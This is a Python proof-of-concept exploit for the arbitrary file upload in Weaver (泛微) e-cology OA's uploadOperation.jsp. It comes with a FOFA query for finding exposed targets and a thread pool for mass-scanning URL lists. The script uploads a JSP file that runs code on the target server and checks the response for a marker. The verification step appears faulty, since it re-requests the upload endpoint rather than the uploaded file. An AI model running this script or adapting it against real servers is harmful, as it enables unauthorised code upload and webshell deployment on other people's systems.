#FOFA: app="泛微-协同办公OA"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': '泛微OA E-Cology uploadOperation.jsp 任意文件上传',
        'vulnerable': False
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    filename = 'test.jsp'
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    timeout = 3
    vurl = urllib.parse.urljoin(target, '/page/exportImport/uploadOperation.jsp')
    payload_data = '''------WebKitFormBoundary6XgyjB6SeCArD3Hc\r\nContent-Disposition: form-data; name="file"; filename="{0}"\r\nContent-Type: application/octet-stream\r\n\r\n{1}\r\n------WebKitFormBoundary6XgyjB6SeCArD3Hc--'''.format(filename, shell)
    verify_url = urllib.parse.urljoin(target, '/page/exportImport/fileTransfer/' + filename)
    try:
        rep = requests.post(vurl, timeout=timeout, verify=False, headers=headers, data=payload_data)
        verify_rep = requests.get(vurl, timeout=timeout, verify=False, headers=headers, data=payload_data)
        if verify_rep.status_code == 200 and re.search(randstr1 + randstr2, rep.text):
            result['vulnerable'] = True
            result['verify'] = verify_url
            print(result)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("泛微OA E-Cology uploadOperation.jsp 任意文件上传漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()